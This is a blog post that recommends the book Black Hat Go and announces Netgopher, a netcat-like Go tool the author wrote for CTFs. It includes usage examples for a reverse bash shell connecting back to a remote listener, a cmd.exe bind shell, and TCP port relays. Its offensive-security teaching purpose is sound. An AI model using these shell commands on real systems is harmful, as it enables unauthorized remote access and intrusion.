---
defaults:
  # _posts
  - scope:
      path: ""
      type: posts
    values:
      layout: single
      author_profile: true
      read_time: true
      comments: false
      share: true
      related: true
title:  "Black Hat Go and Netgopher"
date:   2021-01-30 21:00:00 +0000
header:
  overlay_image: /assets/images/posts/netgopher/go.gif
  teaser: /assets/images/posts/netgopher/go.gif
excerpt: "New tool who dis?"
categories:
  - Labs & Hacking
  - Programming
tags:
  - Lab
  - Go
feature_row1:
  - image_path: /assets/images/posts/netgopher/BHG.webp
    excerpt: "Black Hat Go is an excellent No Starch Press book covering the use of Golang for Pen Testing, bug bounty and other offensive security practices. It also has a pretty cool cover."
    url: https://nostarch.com/blackhatgo
    btn_label: "Check out The Book"
    btn_class: "btn--inverse"
--

NOTE - very excellent gophers from [egonelbre](https://github.com/egonelbre), who has made these public, nice!

# What's all this about?

This week, I dug out my copy of Black Hat Go, a book I've been getting roudn to reading for an age, and I loved the first couple of chapters so much I thought I'd recommend it. 

{% include feature_row id="feature_row1" type="left" %}

NOTE - The very excellent animated gopher is from [egonelbre](https://github.com/egonelbre), who has made these public, nice!

## How will this change my life?

If you're into your security, particularly form an offensive side, using Go will add a really nice new skillset to your toolbox. Go will let you build tools (simple or complex, up to you!) that compile to a single 'blob', run fast and  manage lot's of the hard programming (concurrency included) for you.  

I'd suggest that working witih Go like this is probably most useful for people who are comfortable working with Bash or maybe a little bit of Python, but don't let that hold you back if you're keen.  I've gone through the first chapter or two so far and in just a few evenings, the book has guided me through some really nice simple TCP tooling. 

# Netgopher

This is where Netgopher comes in; this is my super simple implementation of Netcat, built using Go. Most of the Netcat 'extra features' are not included, but I've kept it to those things I find most useful during a CTF, TCP connections, execution and port relays. 

![Example gif of relay usage](assets/images/posts/netgopher/relay.gif)

You can get NetGopher as set out below; the rest of this post is actually en excerpt from the README on the [Github Repo](https://github.com/blackfell/ng){:target="_blank"}

# Installation

You can **but probably shouldn't**  get Netgopher easily with:

```
❯ go get -u "github.com/blackfell/ng"
```

## Why not? 

Well this will only install ng in your local $GOPATH; additionally, the binary will be fairly large, compiled only for your OS. 

I wrote this version to use during CTFs meaning I want a smaller binary, preferably with multi-platform support, so... **grab a copy of all the [released binaries](https://github.com/Blackfell/ng/releases/tag/v0.1) instead**, which have been cross compileed and stripped down to ~ 2MB. 

# Examples

## Basic Usage

```
❯ ng                                                                                                 ─╯
Usage of ng:
  -c value
        Make a TCP Connection : -c 127.0.0.1:8080
  -e string
        Execute a command (quote) : -e '/bin/bash -i'
  -h    Print detailed usage.
  -l value
        Listen on a port : -l 4444
  -v    Display detailed progress messages.
```

The simplest examples are the classic netcat connect and listen functions. You can try this out with a listener/conneciton pair:

![Listener & connect example image](assets/images/posts/netgopher/basic.gif)

## CTF Use Cases
Some really common use cases I have are:
### Start an interactive Bash shell and connect back to a remote listener:
```
# Start a listener on your remote machine
❯ ng -l 1234
# Start the shell
❯ ng -c remote_host:1234 -e '/bin/bash -i'
```
### Start a shell on a bind listener.
This is useful in certail cases because you can create as many conenctions as you like - if your shell drops, just re-connect.
```
❯ ng -l 1234 -e 'cmd.exe'
# Now connect up to the shell
❯ ng -c serving_host:1234
C:\Windowss\system32>
^C
# Oh no! Your shell dropped - try again:
❯ ng -c serving_host:1234
C:\Windowss\system32>

```
### Forward a TCP port back to a remote listener:
```
# Start a relay on your local host
❯ ng -l 1234 -l 445
# On your remote host, forward a connection to local port 445
❯ ng -c local_hostname:1234 -c 127.0.0.1:445
# Your local machine now has access to that remote port 445 on 127.0.0.1:445
```
# Port 'spoofing' - Forward incoming connections to local port:
```
# Listen on port 1234 and forward connections to ssh server
❯ ng -l 1234 -c 127.0.0.1:22
```
# Feedback?
Issues, pulls, emails, tweets all welcome!
